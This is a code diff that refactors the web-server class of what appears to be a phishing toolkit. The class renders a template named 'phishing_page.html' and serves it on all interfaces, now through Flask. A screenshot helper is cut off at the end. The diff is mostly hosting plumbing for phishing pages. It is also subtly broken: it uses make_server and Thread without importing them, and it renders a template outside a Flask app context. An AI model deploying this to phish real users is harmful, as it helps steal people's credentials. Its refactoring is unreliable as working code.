@@ -1,40 +1,33 @@
 #!/usr/bin/python3.7
 import os, random, socketserver, http.server, _thread as thread
+from flask import Flask, render_template_string
 from jinja2 import Environment, PackageLoader, FileSystemLoader
 from binascii import a2b_base64
 from PIL import Image
 from . import Settings
 from selenium.webdriver.common.by import By
 
-class server:
+class Server:
     def __init__(self, template_name="phishing_page.html", *args, **kwargs):
         self.templates_dir = os.path.join(Settings.path,"core","templates")
-        env = Environment(loader=FileSystemLoader(searchpath=self.templates_dir))
-        template = env.get_template(template_name)
-        self.html = template.render(*args,**kwargs)
+        with open(os.path.join(self.templates_dir, template_name), 'r') as f:
+            self.template_str = f.read()
+        self.html = render_template_string(self.template_str, *args, **kwargs)
         self.name = kwargs["name"]
         self.port = kwargs["port"]
+        self.app = Flask(__name__)
+        self.srv = None
+        self.thread = None
+        self.app.route('/')(lambda: self.html)
 
-    def start_serving(self,host="0.0.0.0"):
-        serve_dir = os.path.join(Settings.path,"core","www",self.name)
-        f = open( os.path.join(serve_dir,"index.html"),"w")
-        f.write(self.html)
-        f.close()
-        class ReusableTCPServer(socketserver.TCPServer):
-            allow_reuse_address = True
-            logging = False
-        class MyHandler(http.server.SimpleHTTPRequestHandler):
-            def __init__(self, *args, **kwargs):
-                super().__init__(*args, directory=serve_dir, **kwargs)
-            def log_message(self, format, *args):
-                if self.server.logging:
-                    http.server.SimpleHTTPRequestHandler.log_message(self, format, *args)
-
-        self.httpd = ReusableTCPServer( (host, self.port), MyHandler)
-        t = thread.start_new_thread(self.httpd.serve_forever, ())
+    def start_serving(self, host="0.0.0.0"):
+        self.srv = make_server(host, self.port, self.app)
+        self.thread = Thread(target=self.srv.serve_forever)
+        self.thread.start()
 
     def stop_web_server(self):
-        self.httpd.socket.close()
+        if self.srv is not None:
+            self.srv.shutdown()
 
 class misc:
     def Screenshot( browser, img_xpath, name): # PicName, location, size):
